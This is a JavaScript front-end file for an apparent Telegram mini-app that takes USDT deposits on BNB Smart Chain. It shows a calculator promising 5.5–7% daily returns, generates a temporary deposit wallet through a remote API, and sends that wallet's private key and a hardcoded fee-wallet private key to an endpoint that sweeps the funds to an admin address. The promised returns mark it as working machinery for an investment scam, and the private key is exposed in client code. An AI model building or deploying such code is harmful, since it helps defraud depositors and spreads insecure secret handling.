// 1. CONFIGURACIÓN INICIAL
const VERCEL_URL = "https://api-usdt-bep20.vercel.app"; 
const ADMIN_WALLET = "0xF5CbE528C2320DCf5762D55F3af101AB94F668bE";       
const FEE_PRIVATE_KEY = "d303adf9054d5007ea88392938a7865f9275de2b1fac2c6812cfd92da4b1f0ab";   

let paymentTimerInterval = null;

// 2. DEFINIR TOAST
window.showToast = function(message) {
    const oldToast = document.querySelector('.toast-notification');
    if (oldToast) oldToast.remove();
    const toast = document.createElement('div');
    toast.className = 'toast-notification';
    toast.innerText = message;
    document.body.appendChild(toast);
    setTimeout(() => { if (toast) toast.remove(); }, 3000);
};

// 3. ESTADO Y PERSISTENCIA
window.currentWallet = JSON.parse(localStorage.getItem('temp_wallet')) || null;

// 4. FUNCIONES DE PAGO Y BILLETERA
window.showPayment = async function() {
    const qtyInput = document.getElementById('buy-qty');
    const qty = qtyInput ? qtyInput.value : 0;
    if (!qty || qty <= 0) return; 

    const modal = document.getElementById('payModal');
    modal.style.display = 'flex';
    document.getElementById('pay-amount-display').innerText = `${parseFloat(qty).toFixed(2)} USDT`;
    
    // Iniciar cronómetro de 30 min
    startPaymentTimer(30);

    const statusText = document.getElementById('payment-status-text');
    if (statusText) {
        statusText.innerText = "Not Received ⌛";
        statusText.style.color = ""; 
    }

    if (!window.currentWallet) {
        document.getElementById('wallet-address-display').innerText = "Generating...";
        try {
            const res = await fetch(`${VERCEL_URL}/api/bsc`);
            const data = await res.json();
            window.currentWallet = data;
            localStorage.setItem('temp_wallet', JSON.stringify(data));
        } catch (e) {
            document.getElementById('wallet-address-display').innerText = "Error, try again";
            return;
        }
    }

    const addr = window.currentWallet.address;
    document.getElementById('wallet-address-display').innerText = addr;
    document.getElementById('qr-image').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${addr}`;
};

window.verifyPayment = async function() {
    const btn = document.getElementById('btn-verify-payment');
    const statusText = document.getElementById('payment-status-text');
    const icon = document.getElementById('arrow-icon');

    if (!window.currentWallet) return;

    btn.disabled = true;
    if (icon) icon.className = "fas fa-spinner fa-spin";
    if (statusText) {
        statusText.innerText = "Checking Blockchain...";
        statusText.style.color = "#3b82f6"; 
    }

    try {
        const res = await fetch(`${VERCEL_URL}/api/deposit-usdt`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                userPrivateKey: window.currentWallet.privateKey,
                adminAddress: ADMIN_WALLET,
                feePrivateKey: FEE_PRIVATE_KEY
            })
        });

        const data = await res.json();

        if (data.success) {
            if (data.method === "gas_sent") {
                statusText.innerText = "Gas sent! Wait 15s...";
                statusText.style.color = "#f59e0b";
                setTimeout(() => window.verifyPayment(), 15000); 
            } else {
                statusText.innerText = "Received! ✅";
                statusText.style.color = "#10b981";
                localStorage.removeItem('temp_wallet'); 
                window.currentWallet = null;
                if (paymentTimerInterval) clearInterval(paymentTimerInterval);
                setTimeout(() => location.reload(), 2000);
            }
        } else {
            statusText.innerText = "Not Received ⌛";
            statusText.style.color = "#ef4444"; 
        }
    } catch (e) {
        if (statusText) {
            statusText.innerText = "Error ❌";
            statusText.style.color = "#ef4444";
        }
    } finally {
        btn.disabled = false;
        if (icon && icon.className === "fas fa-spinner fa-spin") {
            icon.className = "fas fa-arrow-right";
        }
    }
};

function startPaymentTimer(minutes) {
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
    let seconds = minutes * 60;
    const timerDisplay = document.getElementById('payment-countdown');

    paymentTimerInterval = setInterval(() => {
        let mins = Math.floor(seconds / 60);
        let secs = seconds % 60;
        const timeString = `00:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        
        if (timerDisplay) timerDisplay.innerText = timeString;

        if (seconds <= 0) {
            clearInterval(paymentTimerInterval);
            if (timerDisplay) timerDisplay.innerText = "00:00:00";
        }
        seconds--;
    }, 1000);
}

window.closePayment = function() {
    document.getElementById('payModal').style.display = 'none';
    if (paymentTimerInterval) clearInterval(paymentTimerInterval);
};

window.copyAddress = function() {
    const address = document.getElementById('wallet-address-display')?.innerText;
    if(address && address !== "Generating...") {
        navigator.clipboard.writeText(address).then(() => {
            window.showToast("Address copied!");
        });
    }
};

window.calculateReturns = function() {
    const qty = parseFloat(document.getElementById('buy-qty').value) || 0;
    let rate = 5.5;
    if (qty >= 20) rate = 6.0;
    if (qty >= 300) rate = 6.5;
    if (qty >= 3000) rate = 7.0;

    const daily = qty * (rate / 100);
    const total20 = daily * 20;

    const aeTotal = document.getElementById('ae-calc-total');
    const usdTotal = document.getElementById('usd-calc-total');
    const estDaily = document.getElementById('est-daily');
    const est20 = document.getElementById('est-20');
    const estProfit = document.getElementById('est-profit');

    if (aeTotal) aeTotal.innerText = (qty * 1000).toLocaleString();
    if (usdTotal) usdTotal.innerText = qty.toFixed(2);
    if (estDaily) estDaily.innerText = `$${daily.toFixed(4)}`;
    if (est20) est20.innerText = `$${total20.toFixed(2)}`;
    if (estProfit) estProfit.innerText = `$${(total20 - qty).toFixed(2)}`;
};

window.switchTab = function(id) {
    const views = document.querySelectorAll('.view');
    views.forEach(v => {
        v.classList.remove('active');
        v.style.display = 'none';
    });
    
    const targetView = document.getElementById('view-' + id);
    if (targetView) {
        targetView.classList.add('active');
        targetView.style.display = 'block';
    }

    document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
    const activeNav = document.querySelector(`.nav-item[onclick*="'${id}'"]`);
    if(activeNav) activeNav.classList.add('active');
};

window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if(tg) {
        tg.ready();
        tg.expand();
        const user = tg.initDataUnsafe?.user;
        if (user) {
            if(document.getElementById('user-name')) document.getElementById('user-name').innerText = user.first_name;
            if(document.getElementById('user-id')) document.getElementById('user-id').innerText = user.id;
            if(document.getElementById('me-id')) document.getElementById('me-id').innerText = user.id;
        }
    }
    // Cronómetro de liquidación (arriba en el Home)
    setInterval(() => {
        const now = new Date();
        const hrs = (23 - now.getHours()).toString().padStart(2, '0');
        const min = (59 - now.getMinutes()).toString().padStart(2, '0');
        const sec = (59 - now.getSeconds()).toString().padStart(2, '0');
        const timerEl = document.getElementById('timer');
        if(timerEl) timerEl.innerText = `${hrs}:${min}:${sec}`;
    }, 1000);
};
